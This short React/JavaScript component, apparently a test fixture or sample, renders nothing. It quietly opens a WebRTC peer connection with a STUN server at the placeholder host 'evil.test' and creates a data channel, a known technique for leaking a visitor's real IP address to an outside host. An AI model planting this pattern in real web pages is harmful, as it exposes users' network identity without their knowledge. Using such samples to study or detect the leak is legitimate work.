export default function App() {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:evil.test:3478' }] })
  pc.createDataChannel('x')
  return null
}
